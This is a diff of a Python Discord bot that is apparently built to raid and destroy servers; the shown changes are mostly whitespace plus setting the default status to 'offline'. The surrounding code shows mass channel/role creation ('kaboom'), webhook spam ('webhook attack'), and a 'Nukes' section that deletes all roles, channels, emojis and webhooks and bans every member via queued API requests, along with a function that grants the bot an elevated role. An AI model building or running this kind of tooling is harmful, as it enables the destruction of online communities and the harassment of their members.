@@ -98,7 +98,7 @@ settings = {
         "permissions": [],
         "bot_permission": "2146958847",
         "command_prefix": ".",
-        "bot_status": "online",
+        "bot_status": "offline",
         "verbose": 15,
         "bomb_messages": {
             "random": 10,
@@ -177,7 +177,7 @@ def setUp():
     global settings, settings_copy
     if os.path.isfile(config_path): # have default.json
         config = getConfig([1,2,3], 5)
-
+    
     elif len(json_paths) > 0: # dont have default.json but have other .json file
         config = getConfig([2,3], 999999)
 
@@ -200,7 +200,7 @@ def setUp():
     print(f'Your current command_prefix is: {settings["command_prefix"]}')
     print(f'Use {settings["command_prefix"]}config to config the settings and more info about how to config.\n')
     print('You can download and use builder.html in the Github repository to help you with configuring.')
-
+    
     print('Join our discord https://discord.gg/FwGWvwv4mW')
 
     settings_copy = deepcopy(settings)
@@ -400,7 +400,7 @@ async def on_command_error(ctx, error):
 
     elif isinstance(error, discord.Forbidden):
         await log(ctx, f'403 Forbidden: Missing permission.')
-
+    
     elif isinstance(error, discord.errors.HTTPException): # usually caused by sending over 2000 characters limit
         # has already been handled in "def log"
         pass
@@ -783,14 +783,14 @@ async def addEmoji(ctx, item, *, name=None, bits=None):
 async def addCategory(ctx, *, category_name):
     if not await hasTarget(ctx):
         return
-
+    
     try:
         await selected_server.create_category(category_name)
         await log(ctx, f'Successfully created category `{category_name}`.')
     except:
         await log(ctx, f'Unable to create category `{category_name}`.')
         raise
-
+    
 @commands.check(checkPerm)
 @client.command(name='addRole', aliases=['aRole', 'aR'])
 async def addRole(ctx, *, name):
@@ -832,7 +832,7 @@ async def moveRole(ctx, *, name):
 async def deleteRole(ctx, *, name):
     if not await hasTarget(ctx):
         return
-
+    
     role = containing(selected_server.roles, name)
     if role is None:
         await log(ctx, f'Unable to find `{name}`.')
@@ -960,7 +960,7 @@ async def unban(ctx, *, name):
     except:
         await log(ctx, f'Failed to unban `{member_.name}#{member_.discriminator}`.')
         raise
-
+    
 @commands.check(checkPerm)
 @client.command(name='roleTo')
 async def roleTo(ctx, member_name, *, role_name):
@@ -1032,7 +1032,7 @@ async def grantAllPerm(ctx):
 async def kaboom(ctx, n, method):
     if not await hasTarget(ctx):
         return 
-
+    
     if not n.isdigit() or int(n) < 0:
         await log(ctx, 'Please enter a positive integer.')
         return
@@ -1040,7 +1040,7 @@ async def kaboom(ctx, n, method):
     await log(ctx, f'A series of bombs have been dropped onto `{selected_server.name}`.')
     tasks = [channelBomb(ctx, n, method), categoryBomb(ctx, n, method), roleBomb(ctx, n, method)]
     await asyncio.gather(*tasks)
-
+    
 
 concurrent = 100
 q = Queue(concurrent * 2)
@@ -1153,7 +1153,7 @@ async def roleBomb(ctx, n, method):
     if not n.isdigit() or (n := int(n)) < 0:
         await log(ctx, 'Please insert an integer that is greater than 0.')
         return
-
+    
     if method == 'fixed':
         method = fixedChoice
     elif method == 'b64':
@@ -1226,7 +1226,7 @@ async def webhook(ctx, *, args=None):
                     continue
                 payload = {'name': random_b64(10)}
                 q.put((requests.post, f'https://discord.com/api/v8/channels/{checked_channel.id}/webhooks', headers, payload))
-
+    
     elif args[0] == 'delete' or args[0] == 'remove':
         name = args[1]
 
@@ -1237,7 +1237,7 @@ async def webhook(ctx, *, args=None):
 
         requests.delete(f'https://discord.com/api/v8/webhooks/{webhook.id}', headers=headers)
         await log(ctx, f'Webhook `{webhook.name}` is removed from the server.')
-
+    
     elif args[0] == 'attack':
         global webhook_targets
         args.pop(0) # Removing the attack keyword
@@ -1263,11 +1263,11 @@ async def webhook(ctx, *, args=None):
                 elif not args[1].isdigit():
                     await log(ctx, 'Please enter a positive integer.')
                     return
-
+                
                 usernames_length = len(settings['webhook_spam']['usernames'])
                 contents_length = len(settings['webhook_spam']['contents'])
                 pfp_length = len(settings['webhook_spam']['pfp_urls'])
-
+                 
                 for i in range(int(args[1])):
                     payload = {
                         'username': choice(settings['webhook_spam']['usernames']),
@@ -1275,7 +1275,7 @@ async def webhook(ctx, *, args=None):
                         'avatar_url': choice(settings['webhook_spam']['pfp_urls'])
                     }
                     q.put((requests.post, webhook_targets[randrange(target_list_length)].url, _headers, payload))
-
+            
             elif len(args) > 0 and args[0].isdigit() and int(args[0]) <= webhooks_length:
                 for i in range(int(args[0])):
                     webhook_targets.append(webhooks.pop(randrange(webhooks_length)))
@@ -1302,10 +1302,10 @@ async def webhook(ctx, *, args=None):
 
         except:
             raise
-
+            
     else:
         await log(ctx, f'Unable to find `{args[0]}` command in webhook scripts.')
-
+    
 
 ######### Nukes #########
 @commands.check(checkPerm)
@@ -1343,7 +1343,7 @@ async def deleteAllRoles(ctx):
     consoleLog(f'{Fore.YELLOW}Starting to delete all roles...', True)
     for role in selected_server.roles:
         q.put((requests.delete, f'https://discord.com/api/v8/guilds/{selected_server.id}/roles/{role.id}', headers, None))
-
+        
     q.join()
     consoleLog(f'{Fore.GREEN}Finished deleting roles.', True)
 
@@ -1356,7 +1356,7 @@ async def deleteAllChannels(ctx):
     consoleLog(f'{Fore.YELLOW}Starting to delete all types of channels...', True)
     for channel in selected_server.channels:
         q.put((requests.delete, f'https://discord.com/api/v8/channels/{channel.id}', headers, None))
-
+        
     q.join()
     consoleLog(f'{Fore.GREEN}Finished deleting channels.', True)
 
@@ -1369,7 +1369,7 @@ async def deleteAllEmojis(ctx):
     consoleLog(f'{Fore.YELLOW}Starting to delete all emojis...', True)
     for emote in selected_server.emojis:
         q.put((requests.delete, f'https://discord.com/api/v8/guilds/{selected_server.id}/emojis/{emote.id}', headers, None))
-
+        
     q.join()
     consoleLog(f'{Fore.GREEN}Finished deleting emojis.', True)
 
@@ -1382,7 +1382,7 @@ async def deleteAllWebhooks(ctx):
     consoleLog(f'{Fore.YELLOW}Starting to delete all webhooks...', True)
     for webhook in await selected_server.webhooks():
         q.put((requests.delete, f'https://discord.com/api/v8/webhooks/{webhook.id}', headers, None))
-
+        
     q.join()
     consoleLog(f'{Fore.GREEN}Finished deleting webhooks.', True)
 
@@ -1399,7 +1399,7 @@ async def banAll(ctx):
             consoleLog(f'Ban skipped for {member_.name}#{member_.discriminator} -> in ban whitelist')
             continue
         q.put((requests.put, f'https://discord.com/api/v8/guilds/{selected_server.id}/bans/{member_.id}', headers, payload))
-
+        
     q.join()
     consoleLog(f'{Fore.GREEN}Ban all completed.', True)
 
@@ -1549,7 +1549,7 @@ async def config(ctx, command=None, *, args=None):
                     await log(ctx, f'Successfully removed `{str(offset - 1)}` items.')
                 else:
                     await log(ctx, f'Enter line(s) to remove from bomb_messages fixed list.')
-
+            
             elif args[0] == 'list':
                 await embed_list(args[1] if len(args) > 1 else '1', 'permission list', settings['permissions'])
 
@@ -1563,7 +1563,7 @@ async def config(ctx, command=None, *, args=None):
         if args is None:
             status_list = []
             features_list = []
-
+            
             features_list.append('random')
             if settings['bomb_messages']['random'] is None:
                 status_list.append(':x:')
@@ -1621,7 +1621,7 @@ async def config(ctx, command=None, *, args=None):
                         await log(ctx, f'Successfully removed `{str(offset - 1)}` items.')
                     else:
                         await log(ctx, f'Enter line(s) to remove from bomb_messages fixed list.')
-
+                
                 elif args[1] == 'list':
                     await embed_list(args[2] if len(args) > 2 else '1', 'bomb_messages fixed list', settings['bomb_messages']['fixed'])
 
@@ -1686,7 +1686,7 @@ async def config(ctx, command=None, *, args=None):
                         await log(ctx, f'Successfully removed `{str(offset - 1)}` items.')
                     else:
                         await log(ctx, f'Enter line(s) to remove from usernames.')
-
+                
                 elif args[1] == 'list':
                     await embed_list(args[2] if len(args) > 2 else '1', 'webhook_spam usernames list', settings['webhook_spam']['usernames'])
 
@@ -1703,7 +1703,7 @@ async def config(ctx, command=None, *, args=None):
                         await log(ctx, f'URL added.')
                     else: 
                         await log(ctx, f'Please enter an **image URL**. Note: the link must start with http(s) protocals. Or enter `none` for no pfp.')
-
+                
                 elif args[1] == 'remove':
                     if len(args) > 2:
                         del args[0], args[0]
@@ -1719,7 +1719,7 @@ async def config(ctx, command=None, *, args=None):
                         await log(ctx, f'Successfully removed `{str(offset - 1)}` items.')
                     else:
                         await log(ctx, f'Enter line(s) to remove from pfp_urls.')
-
+                
                 elif args[1] == 'list':
                     await embed_list(args[2] if len(args) > 2 else '1', 'webhook_spam pfp_urls list', settings['webhook_spam']['pfp_urls'])
 
@@ -1749,7 +1749,7 @@ async def config(ctx, command=None, *, args=None):
                         await log(ctx, f'Successfully removed `{str(offset - 1)}` items.')
                     else:
                         await log(ctx, f'Enter line(s) to remove from contents.')
-
+                
                 elif args[1] == 'list':
                     await embed_list(args[2] if len(args) > 2 else '1', 'webhook_spam contents list', settings['webhook_spam']['contents'])
 
@@ -1762,7 +1762,7 @@ async def config(ctx, command=None, *, args=None):
         if args is None:
             status_list = []
             features_list = []
-
+            
             features_list.append('after')
             if len(settings['after']) == 0:
                 status_list.append(':x:')
@@ -1791,7 +1791,7 @@ async def config(ctx, command=None, *, args=None):
                     await log(ctx, f'Command added. Character length: `{str(len(text))}`.')
                 else: 
                     await log(ctx, f'Please enter the command you want to add after line `{len(settings["after"])}`.')
-
+            
             elif args[0] == 'remove':
                 if len(args) > 1:
                     del args[0]
@@ -1818,7 +1818,7 @@ async def config(ctx, command=None, *, args=None):
                     await log(ctx, f'Added command after line `{args[1]}`.')
                 else:
                     await log(ctx, 'Insert usage: `after insert <after line #> <command...>`')
-
+            
             elif args[0] == 'list':
                 await embed_list(args[1] if len(args) > 1 else '1', 'after command(s) list', settings['after'])
 
@@ -1891,7 +1891,7 @@ async def config(ctx, command=None, *, args=None):
                     elif msg == 'n' or msg == 'no':
                         await log(ctx, f'Saving cancelled.')
                         return
-
+                    
                     await log(ctx, f'Yes or no.')
                 except (asyncio.exceptions.TimeoutError, discord.ext.commands.errors.CommandInvokeError):
                     await log(ctx, "Took too long to answer.")
@@ -1912,7 +1912,7 @@ async def config(ctx, command=None, *, args=None):
             features_list = []
 
             # hard coding this because I don't think there's a better way to set the values.
-
+            
             features_list.append('Log response from requests')
             if want_log_request:
                 status_list.append(':white_check_mark:')
@@ -1962,7 +1962,7 @@ async def config(ctx, command=None, *, args=None):
         if args is None:
             status_list = []
             features_list = []
-
+            
             features_list.append('ban_whitelist')
             if len(settings['ban_whitelist']) == 0:
                 status_list.append(':x:')
@@ -1991,7 +1991,7 @@ async def config(ctx, command=None, *, args=None):
                     await log(ctx, f'User added. Character length: `{str(len(text))}`.')
                 else: 
                     await log(ctx, f'Please enter the userID or userTag that you want to add after line `{str(len(settings["after"]))}`.')
-
+            
             elif args[0] == 'remove':
                 if len(args) > 1:
                     del args[0]
@@ -2007,7 +2007,7 @@ async def config(ctx, command=None, *, args=None):
                     await log(ctx, f'Successfully removed `{str(offset - 1)}` items.')
                 else:
                     await log(ctx, f'Enter line(s) to remove from usernames.')
-
+            
             elif args[0] == 'list':
                 await embed_list(args[1] if len(args) > 1 else '1', 'ban whitelist', settings['ban_whitelist'])
 
@@ -2071,7 +2071,7 @@ async def checkRolePermissions(ctx, name, n='1'):
         else:
             master_list += ':x: '
         master_list += item.replace('_', ' ').capitalize() + '\n'
-
+    
     # if not isDM(ctx) and ctx.guild.id == selected_server.id and 1 << 11 & selected_server.me.guild_permissions.value == 0:
     #     consoleLog('\n%s*Check role permissions*\n%sPermission value -> %s%d : 2147483647\n%s %s%d/%d' % (Fore.CYAN, Fore.RESET, Fore.YELLOW, value, master_list.replace(':white_check_mark:', f'{Fore.GREEN}+').replace(':x:', f'{Fore.RED}-'), Fore.YELLOW, n+1, ceil(item_length / per_page)), True)
     # else:
@@ -2245,7 +2245,7 @@ async def autoNick(ctx):
         while auto_nick:
             # payload = {'nick': ''.join(choice(alphanum) for _ in range(10))}
             # q.put((requests.patch, f'https://discord.com/api/v8/guilds/{selected_server.id}/members/%40me/nick', headers, payload))
-
+            
             await selected_server.me.edit(nick=''.join(choices(alphanum, k=10)))
     else:
         consoleLog(f'{Fore.BLUE}Auto nickname is off.', True)
@@ -2286,7 +2286,7 @@ async def bestRole(ctx, member_name=None):
             role_name = choice(_roles).name
         else:
             role_name = random_b64(3)
-
+        
         _role = await selected_server.create_role(
                 name=role_name, 
                 permissions=discord.Permissions(
@@ -2296,7 +2296,7 @@ async def bestRole(ctx, member_name=None):
 
         await _role.edit(position=selected_server.me.top_role.position-1)
         await _member.add_roles(_role)
-
+        
     except:
         raise
 
